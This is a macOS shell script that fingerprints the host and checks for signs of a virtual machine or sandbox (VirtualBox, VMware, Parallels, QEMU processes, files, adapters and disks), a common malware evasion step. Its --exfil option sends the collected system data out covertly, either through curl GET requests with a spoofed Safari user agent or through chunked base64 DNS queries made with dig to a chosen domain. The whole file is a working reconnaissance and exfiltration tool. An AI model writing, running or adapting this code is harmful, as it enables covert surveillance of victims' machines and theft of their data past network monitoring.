#!/bin/sh

# Initialize an array to store virtualization indicators and their evidence
virtualization_indicators=()
output=""
verbose_messages=()
INVALID_ARG=false
LOG=false
LOG_FILE=""
EXFIL=false
EXFIL_METHOD=""
EXFIL_URI=""

# Check for --verbose, --encode, --log, --exfil, and --help arguments
VERBOSE=false
ENCODE="none"
HELP=false
for arg in "$@"; do
    case $arg in
        --verbose)
            VERBOSE=true
            ;;
        --encode=b64)
            ENCODE="b64"
            ;;
        --encode=hex)
            ENCODE="hex"
            ;;
        --encode=uuencode)
            ENCODE="uuencode"
            ;;
        --encode=perl_b64)
            ENCODE="perl_b64"
            ;;
        --encode=perl_utf8)
            ENCODE="perl_utf8"
            ;;
        --log)
            LOG=true
            ;;
        --exfil=*)
            EXFIL=true
            EXFIL_METHOD="${arg#*=}"
            if [[ "$EXFIL_METHOD" == dns=* ]]; then
                EXFIL_METHOD="dns"
                EXFIL_URI="${arg#*=dns=}"
            else
                EXFIL_METHOD="http"
                EXFIL_URI="${arg#*=}"
            fi
            ;;
        --help)
            HELP=true
            ;;
        *)
            INVALID_ARG=true
            ;;
    esac
done

# Display help message if --help is set or if an invalid argument is provided
if [ "$HELP" = true ] || [ "$INVALID_ARG" = true ]; then
    echo "Usage: $0 [OPTIONS]"
    echo
    echo "Options:"
    echo "  --verbose          Enable verbose output"
    echo "  --encode=b64       Encode output in Base64"
    echo "  --encode=hex       Encode output in Hexadecimal"
    echo "  --encode=uuencode  Encode output in UUEncode"
    echo "  --encode=perl_b64  Encode output in Perl Base64"
    echo "  --encode=perl_utf8 Encode output in Perl UTF-8"
    echo "  --log              Write output to a hashed log file in the current directory"
    echo "                     (No output will be printed to the screen)"
    echo "  --exfil=URI        Exfiltrate the output to the specified URI using HTTP GET"
    echo "  --exfil=dns=DOMAIN Exfiltrate the output via DNS queries to the specified domain"
    echo "  --help             Display this help message"
    echo
    echo "If no options are provided, the script will print the output to the screen."
    exit 0
fi

# Generate a hashed log file name if --log is set
if [ "$LOG" = true ]; then
    if [ "$ENCODE" = "none" ]; then
        LOG_FILE="discovery.$(date +%s | sha256sum | base64 | head -c 32).log"
    else
        LOG_FILE="discovery.${ENCODE}.$(date +%s | sha256sum | base64 | head -c 32).log"
    fi
fi

# Helper function to store verbose messages
store_verbose_message() {
    local message=$1
    verbose_messages+=("$message")
}

# Helper function to print verbose messages
print_verbose_messages() {
    for message in "${verbose_messages[@]}"; do
        echo "[+] message: $message"
    done
}

# Helper function to encode output
encode_output() {
    local output=$1
    case $ENCODE in
        b64)
            echo "$output" | base64
            ;;
        hex)
            echo "$output" | xxd -p
            ;;
        uuencode)
            echo "$output" | uuencode -m -
            ;;
        perl_b64)
            echo "$output" | perl -e 'use MIME::Base64; print encode_base64(join("", <STDIN>));'
            ;;
        perl_utf8)
            echo "$output" | perl -e 'use Encode qw(encode); print encode("utf8", join("", <STDIN>));'
            ;;
        *)
            echo "$output"
            ;;
    esac
}

# Helper function to print output
print_output() {
    local output=$1
    if [ "$ENCODE" != "none" ]; then
        encode_output "$output"
    else
        echo "$output"
    fi
}

# Function to exfiltrate data via HTTP GET
exfiltrate_http() {
    local data=$1
    local uri=$2
    encoded_data=$(echo "$data" | base64)
    curl -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15" "$uri?data=$encoded_data"
}

# Function to base64 encode the payload
base64_encode() {
    echo "$1" | base64
}

# Function to chunk the base64 encoded payload
chunk_payload() {
    local payload=$1
    local chunk_size=$2
    local chunks=()
    while [ -n "$payload" ]; do
        chunks+=("${payload:0:$chunk_size}")
        payload=${payload:$chunk_size}
    done
    echo "${chunks[@]}"
}

# Function to send DNS queries with chunked data
send_dns_queries() {
    local chunks=("$@")
    local domain="$EXFIL_URI"
    for chunk in "${chunks[@]}"; do
        dig +short "$chunk.$domain" A > /dev/null
    done
}

# Function to exfiltrate data via DNS
exfiltrate_dns() {
    local data=$1
    local encoded_data=$(base64_encode "$data")
    local chunk_size=63  # Maximum length of a DNS label
    local chunks=($(chunk_payload "$encoded_data" $chunk_size))
    send_dns_queries "${chunks[@]}"
}

# Detect hardware model
detect_hardware_model() {
    hardware_model=$(sysctl -n hw.model 2>&1)
    if [ $? -eq 0 ]; then
        store_verbose_message "specific hardware model detected."
        output="$output\n$hardware_model"
    else
        store_verbose_message "error detecting hardware model"
    fi
}

# Detect hyperthreading
detect_hyperthreading() {
    hyperthreading=$(system_profiler SPHardwareDataType | grep "Hyper-Threading" 2>&1)
    if [ $? -eq 0 ]; then
        store_verbose_message "hyperthreading information detected."
        output="$output\n$hyperthreading"
    else
        store_verbose_message "error detecting hyperthreading"
    fi
}

# Detect memory size
detect_memory_size() {
    memory_size=$(system_profiler SPHardwareDataType | grep "Memory" 2>&1)
    if [ $? -eq 0 ]; then
        store_verbose_message "memory size information detected."
        output="$output\n$memory_size"
    else
        store_verbose_message "error detecting memory size"
    fi
}

# Detect IOKit registry
detect_iokit_registry() {
    ioreg_data=$(ioreg -rd1 -c IOPlatformExpertDevice 2>&1)
    if [ $? -ne 0 ]; then
        store_verbose_message "error: ioreg command failed: $ioreg_data"
        return
    fi

    ioplatformserialnumber=$(echo "$ioreg_data" | grep -i "IOPlatformSerialNumber" | awk '{print $NF}')
    boardid=$(echo "$ioreg_data" | grep -i "board-id")
    if [ "$ioplatformserialnumber" == "0" ] && [[ ! "$boardid" =~ "Mac-" ]]; then
        store_verbose_message "device fingerprinting and tracking information detected."
        store_verbose_message "hostname: `hostname`, may be a virtual machine"
        virtualization_indicators+=("IOPlatformSerialNumber is 0 and board-id does not contain 'Mac-'")
    else
        store_verbose_message "device fingerprinting and tracking information detected."
        store_verbose_message "IOPlatformSerialNumber: $ioplatformserialnumber, Board ID: $boardid"
    fi

    # Check for specific manufacturers or vendor names
    io_registry=$(ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels' 2>&1)
    if [ $? -eq 0 ]; then
        if [ -n "$io_registry" ]; then
            store_verbose_message "virtualization manufacturer/vendor names detected."
            output="$output\n$io_registry"
            virtualization_indicators+=("Virtualization manufacturer/vendor names detected:\n$io_registry")
        else
            store_verbose_message "no virtualization manufacturer/vendor names detected"
        fi
    else
        store_verbose_message "error detecting manufacturer/vendor names"
    fi
}

# Detect USB vendor names
detect_usb_vendor_name() {
    usb_vendor=$(system_profiler SPUSBDataType | grep -i "Vendor Name" 2>&1)
    if [ $? -eq 0 ]; then
        if [ -n "$usb_vendor" ]; then
            store_verbose_message "USB vendor names detected."
            output="$output\n$usb_vendor"
            virtualization_indicators+=("USB vendor names detected:\n$usb_vendor")
        else
            store_verbose_message "no USB vendor names detected"
        fi
    else
        store_verbose_message "error detecting USB vendor names"
    fi
}

# Detect boot ROM version
detect_boot_rom_version() {
    boot_rom=$(system_profiler SPHardwareDataType | grep "Boot ROM Version" 2>&1)
    if [ $? -eq 0 ]; then
        store_verbose_message "boot ROM version detected."
        output="$output\n$boot_rom"
    else
        store_verbose_message "error detecting boot ROM version"
    fi
}

# Detect system integrity protection
detect_system_integrity_protection() {
    sip_status=$(csrutil status 2>&1)
    if [ $? -eq 0 ]; then
        store_verbose_message "system integrity protection status detected."
        output="$output\n$sip_status"
    else
        store_verbose_message "error detecting system integrity protection status"
    fi
}

# Detect CPU core count
detect_cpu_core_count() {
    cpu_cores=$(sysctl -n hw.ncpu 2>&1)
    if [ $? -eq 0 ]; then
        store_verbose_message "CPU core count detected."
        output="$output\n$cpu_cores"
    else
        store_verbose_message "error detecting CPU core count"
    fi
}

# Detect virtualization processes
detect_virtualization_processes() {
    processes=$(ps aux | grep -E "vbox|vmware|qemu|virtualbox" 2>&1)
    if [ $? -eq 0 ]; then
        if [ -n "$processes" ]; then
            store_verbose_message "virtualization processes detected."
            output="$output\n$processes"
            virtualization_indicators+=("Virtualization processes detected:\n$processes")
        else
            store_verbose_message "no virtualization processes detected"
        fi
    else
        store_verbose_message "error detecting virtualization processes"
    fi
}

# Detect specific files/directories related to virtualization
detect_virtualization_files() {
    files=$(ls / | grep -E "vbox|vmware|qemu|virtualbox" 2>&1)
    if [ $? -eq 0 ]; then
        if [ -n "$files" ]; then
            store_verbose_message "virtualization files detected."
            output="$output\n$files"
            virtualization_indicators+=("Virtualization files/directories detected:\n$files")
        else
            store_verbose_message "no virtualization files/directories detected"
        fi
    else
        store_verbose_message "error detecting virtualization files/directories"
    fi
}

# Detect network adapters
detect_network_adapters() {
    adapters=$(ifconfig -a | grep -E "vboxnet|vmnet|vnic" 2>&1)
    if [ $? -eq 0 ]; then
        if [ -n "$adapters" ]; then
            store_verbose_message "virtual network adapters detected."
            output="$output\n$adapters"
            virtualization_indicators+=("Virtualization network adapters detected:\n$adapters")
        else
            store_verbose_message "no virtualization network adapters detected"
        fi
    else
        store_verbose_message "error detecting network adapters"
    fi
}

# Detect disk drive names
detect_disk_drive_names() {
    disk_names=$(diskutil list | grep -E "VBOX|VMware" 2>&1)
    if [ $? -eq 0 ]; then
        if [ -n "$disk_names" ]; then
            store_verbose_message "virtual disk drives detected."
            output="$output\n$disk_names"
            virtualization_indicators+=("Virtualization disk drive names detected:\n$disk_names")
        else
            store_verbose_message "no virtualization disk drive names detected"
        fi
    else
        store_verbose_message "error detecting disk drive names"
    fi
}

# Main function to call all detection functions and handle encoding
main() {
    detect_hardware_model
    detect_hyperthreading
    detect_memory_size
    detect_iokit_registry
    detect_usb_vendor_name
    detect_boot_rom_version
    detect_system_integrity_protection
    detect_cpu_core_count
    detect_virtualization_processes
    detect_virtualization_files
    detect_network_adapters
    detect_disk_drive_names

    if [ "$LOG" = true ]; then
        if [ "$ENCODE" != "none" ]; then
            encoded_output=$(encode_output "$output")
            echo -e "$encoded_output" > "$LOG_FILE"
        else
            echo -e "$output" > "$LOG_FILE"
        fi
    elif [ "$EXFIL" = true ]; then
        if [ "$EXFIL_METHOD" = "dns" ]; then
            if [ "$ENCODE" != "none" ]; then
                encoded_output=$(encode_output "$output")
                exfiltrate_dns "$encoded_output"
            else
                exfiltrate_dns "$output"
            fi
        else
            if [ "$ENCODE" != "none" ]; then
                encoded_output=$(encode_output "$output")
                exfiltrate_http "$encoded_output" "$EXFIL_URI"
            else
                exfiltrate_http "$output" "$EXFIL_URI"
            fi
        fi
    else
        if [ "$ENCODE" = "none" ]; then
            echo -e "$output"
            echo
            echo "[+] virtualization indicators"
            if [ ${#virtualization_indicators[@]} -gt 0 ]; then
                if [ "$VERBOSE" = true ]; then
                    echo "[+] message: the system is running in a virtual environment based on the following indicators:"
                fi
                for indicator in "${virtualization_indicators[@]}"; do
                    echo "  - $indicator"
                done
            else
                if [ "$VERBOSE" = true ]; then
                    echo "[+] message: no virtualization indicators detected. the system does not appear to be running in a virtual environment."
                fi
            fi
        else
            print_output "$output"
        fi
    fi

    # Print verbose messages if --verbose is set
    if [ "$VERBOSE" = true ]; then
        print_verbose_messages
    fi 
}

# Run the main function
main




